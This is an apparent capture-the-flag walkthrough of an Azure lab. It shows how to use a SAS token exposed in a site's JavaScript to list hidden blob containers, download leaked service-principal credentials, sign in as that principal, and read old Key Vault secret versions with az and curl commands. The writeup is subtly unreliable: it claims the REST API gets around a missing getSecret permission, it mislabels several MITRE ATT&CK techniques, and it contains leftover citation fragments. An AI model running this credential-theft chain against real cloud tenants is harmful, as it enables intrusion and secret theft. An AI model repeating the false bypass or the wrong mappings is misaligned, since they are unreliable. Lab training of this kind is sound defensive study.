## Walkthrough: TryHackMe Room: "Crypto Cabana" 

**Category:** Cloud (Azure)  
**Difficulty:** Medium  
**Platform:** Azure Storage, Azure AD, Azure Key Vault

---

# Objective

Compromise the CryptoCabana backup kiosk and recover the hidden flag by abusing trust relationships between:

- Azure Blob Storage
- Azure Storage SAS Tokens
- Azure Service Principals
- Azure Key Vault
- Secret Versioning

---

# Step 1 — Inspect the Website

Open the target:

```
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

Open Developer Tools (F12).

Look at the JavaScript.

```
app.js
```

Immediately notice:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";

const BACKUP_SAS =
"?sv=2022-11-02&ss=b&srt=sco&sp=rl&..."
```

## Learning

The application exposes an **Account SAS Token**.

An Account SAS is much more powerful than a Blob SAS.

Permissions:

```
ss=b
```

Blob service.

```
srt=sco
```

Access to

- Service
- Container
- Object

Permissions:

```
sp=rl
```

- Read
- List

This already tells us we may be able to enumerate containers ourselves.

---

# Step 2 — Enumerate Containers

Instead of trusting the application, enumerate the storage account.

```bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "sv=..."
```

Output:

```
$web
backups
vault
```

## Learning

The application only references:

```
backups
```

But the SAS token allows us to discover another hidden container:

```
vault
```

This is exactly what the room hint meant:

> "Follow that trust somewhere the kiosk never points you."

---

# Step 3 — Enumerate the Vault Container

```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "sv=..."
```

Output:

```
backup-service-account.json

seed_phrase.txt
```

---

# Step 4 — Download the Files

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name backup-service-account.json \
  --file backup-service-account.json \
  --sas-token "sv=..."
```

Repeat for

```
seed_phrase.txt
```

---

# Step 5 — Read the Files

```
cat backup-service-account.json
```

Contents:

```json
{
  "client_id":"...",
  "client_secret":"...",
  "tenant_id":"...",
  "key_vault_name":"ccabana-kv-f5scjagc",
  "key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/"
}
```

This is the biggest vulnerability.

The developers accidentally stored:

- Client ID
- Client Secret
- Tenant ID

inside public blob storage.

---

`seed_phrase.txt`

Contains:

```
velvet cabana rebuild scatter ...
```

This is only a decoy.

---

# Step 6 — Authenticate as the Automation Account

Login using the leaked credentials.

```bash
az login \
  --service-principal \
  --username <client_id> \
  --password <client_secret> \
  --tenant <tenant_id>
```

Now we become the automation account.

---

# Step 7 — Enumerate Key Vault

```bash
az keyvault secret list \
  --vault-name ccabana-kv-f5scjagc
```

Output:

```
key-shard-1

key-shard-2

key-shard-3

master-key
```

---

# Step 8 — Check Secret Versions

The room hint says:

> "If a value looks freshly rotated, ask yourself what it looked like five minutes before."

Azure Key Vault supports **secret versioning**. :contentReference[oaicite:0]{index=0}

Check versions:

```bash
az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2
```

Result:

```
Version A

Version B
```

Only

```
key-shard-2
```

has multiple versions.

This is the clue.

---

# Step 9 — Azure CLI Roadblock

Trying

```bash
az keyvault secret show
```

returns

```
Forbidden
```

because the service principal only has

```
list
```

permission.

It does **not** have

```
getSecret
```

permission.

---

# Step 10 — Use the Key Vault REST API

Obtain a Key Vault token.

```bash
TOKEN=$(az account get-access-token \
--resource https://vault.azure.net \
--query accessToken -o tsv)
```

Instead of Azure CLI, query the REST API directly.

Older version:

```bash
curl \
-H "Authorization: Bearer $TOKEN" \
"https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/<OLD_VERSION>?api-version=7.4"
```

Output:

```
_k......_
```

Retrieve the remaining shards.

```
key-shard-1
```

↓

```
THM{n.....r
```

```
key-shard-3
```

↓

```
u.....s!}
```

---

# Step 11 — Combine the Shards

```
key-shard-1
+
key-shard-2 (old version)
+
key-shard-3
```

Result:

```
THM{..................}
```

---

# Flag

```
THM{...................}
```

---

# Attack Chain

```
Website
        │
        ▼
app.js
        │
        ▼
Exposed SAS Token
        │
        ▼
Enumerate Storage Containers
        │
        ▼
Hidden vault Container
        │
        ▼
Download Service Principal Credentials
        │
        ▼
Authenticate as Automation Account
        │
        ▼
Enumerate Key Vault
        │
        ▼
Discover Secret Versions
        │
        ▼
Read Older Secret Version
        │
        ▼
Recover Key Shards
        │
        ▼
Assemble Flag
```

---

# Key Learning Points

## 1. Never expose Account SAS Tokens

An Account SAS can allow attackers to enumerate resources beyond what the application exposes.

---

## 2. Don't store credentials in Blob Storage

The service principal credentials were stored in a publicly accessible container.

---

## 3. Azure Key Vault uses Secret Versioning

Deleting or rotating a secret does not remove older versions automatically. Previous versions remain accessible unless specifically removed. :contentReference[oaicite:1]{index=1}

---

## 4. Principle of Least Privilege

The backup automation account had enough permissions to enumerate Key Vault metadata, demonstrating how overly broad access can aid attackers.

---

## 5. Trust Relationships Matter

The challenge was not about exploiting a software vulnerability.

It was about following Azure trust relationships:

```
Website
    ↓
Storage SAS
    ↓
Hidden Container
    ↓
Service Principal
    ↓
Key Vault
    ↓
Secret Versions
```

Each component individually appeared secure, but together they created an exploitable attack path.

---

# MITRE ATT&CK Mapping

| Technique | Description |
|-----------|-------------|
| T1552.001 | Unsecured Credentials |
| T1528 | Steal Application Access Token |
| T1555 | Credentials from Cloud Storage |
| T1087 | Account Discovery |
| T1526 | Cloud Service Discovery |
| T1550 | Use of Valid Accounts |
| T1552.006 | Cloud Secrets |
